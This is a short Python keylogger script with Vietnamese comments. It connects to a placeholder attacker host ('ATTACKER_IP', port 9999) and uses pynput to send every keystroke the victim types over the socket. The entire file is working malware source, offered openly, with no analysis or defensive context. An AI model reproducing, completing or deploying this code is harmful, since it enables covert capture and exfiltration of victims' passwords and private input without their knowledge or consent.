import socket
import threading
from pynput.keyboard import Key, Listener

# Kết nối tới máy attacker
def connect_to_attacker(server_ip='ATTACKER_IP', server_port=PORT):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    return client

# Hàm keylogger để ghi lại các phím bấm
def on_press(key, client):
    try:
        client.send(f"{key.char}".encode('utf-8'))
    except AttributeError:
        client.send(f"{key}".encode('utf-8'))

# Lắng nghe các phím bấm
def start_keylogger(client):
    with Listener(on_press=lambda key: on_press(key, client)) as listener:
        listener.join()

if __name__ == "__main__":
    client = connect_to_attacker('ATTACKER_IP', 9999)
    start_keylogger(client)
